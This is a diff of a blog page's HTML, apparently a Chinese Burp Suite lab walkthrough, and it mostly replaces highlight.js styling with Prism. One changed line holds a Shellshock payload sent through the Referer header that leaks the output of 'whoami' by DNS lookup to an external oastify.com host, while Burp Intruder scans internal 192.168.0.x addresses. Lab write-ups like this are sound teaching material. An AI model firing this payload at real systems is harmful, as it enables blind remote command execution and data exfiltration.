@@ -72,10 +72,6 @@
   
 
   
-    
-<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
-
-  
 
   <link
   rel="stylesheet"
@@ -83,7 +79,8 @@
   media="all"
 />
 
-</head><body>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body>
 
 
 
@@ -264,7 +261,7 @@
 <p>使用 Burp Collaborator 客户端，更改 Referer 标头，<code>http://192.168.0.1:8080</code> IP 地址的最后一个八位字节，添加 <code>§</code></p>
 </li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">() &#123; :; &#125;; /usr/bin/nslookup $(whoami).yac7iwqg4tsdlyai7czxo0rrcii96y.oastify.com<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; /usr/bin/nslookup $(whoami).yac7iwqg4tsdlyai7czxo0rrcii96y.oastify.com</span><br></pre></td></tr></table></figure>
 <ol start="4">
 <li>
 <p>Payloads 窗口，将 payload 类型为 Numbers，<code>1、255、1</code>，开始攻击</p>
@@ -781,28 +778,16 @@
     }
   });
 </script>
-<script>
-  document.addEventListener('DOMContentLoaded', function () {
-    window.codeElements = document.querySelectorAll('.code');
-    if (window.codeElements.length > 0) {
-      ctx.copycode = {
-        default_text: `Copy`,
-        success_text: `Copied`,
-        toast: ``,
-      };
-      utils.js('/js/plugins/copycode.js');
-    }
-  });
-</script>
+
 
 
                   <!-- inject -->
                   
 
-                    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+                    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
                     <script>
                       hljs.highlightAll();  // 这段代码会自动找到页面中所有的代码块并进行高亮
-                    </script><script src="/js/plugins/copycode.js"></script>
+                    </script> --><script src="/js/plugins/copycode.js"></script>
     <script type="text/javascript" 
       color="220,220,220" 
       opacity="0.7" 
